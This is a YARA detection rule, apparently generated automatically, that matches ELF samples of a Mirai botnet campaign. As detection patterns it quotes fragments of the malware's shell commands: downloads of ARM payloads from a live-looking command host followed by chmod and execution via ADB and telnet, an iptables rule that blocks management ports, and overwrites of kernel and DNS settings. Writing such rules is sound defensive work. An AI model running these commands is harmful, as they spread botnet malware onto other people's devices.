rule Sightlines_c2_e7824e15_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-e7824e15"
        date = "2026-11-01"
        campaign = "c2-e7824e15"
        family = "mirai"
        hash = "323c3cff3088cebcb9d637896828aa4f29a3a5e726b7b0cf1a6ecf6fe8d8883e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-e7824e15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "iptables -I INPUT -p tcp -m multiport --dports 23,2323,5555,7547,80,8080,22,2222 -j DROP 2>/dev/null" ascii
        $s1 = "echo '4096 87380 16777216' > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null" ascii
        $s2 = "echo '1024 65535' > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null" ascii
        $s3 = " x || busybox wget http://phubotnet.duckdns.org/main_arm -O x || curl -O http://phubotnet.duckdns.or" ascii
        $s4 = "echo 4194304 > /proc/sys/net/core/wmem_default 2>/dev/null" ascii
        $s5 = " busybox wget http://phubotnet.duckdns.org/%s -O %s || curl -O http://phubotnet.duckdns.org/%s; busy" ascii
        $s6 = "echo 100000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null" ascii
        $s7 = "echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null" ascii
        $s8 = "shell:cd /data/local/tmp || cd /data/tmp || cd /cache; wget http://phubotnet.duckdns.org/main_arm -O" ascii
        $s9 = "echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null" ascii
        $s10 = "g/main_arm; busybox chmod 777 x main_arm; chmod 777 x main_arm; ./x adb.telnet &; ./main_arm adb.tel" ascii
        $s11 = "echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>/dev/null; echo 'nameserver 1.1.1.1' >> /etc/resolv.c" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}
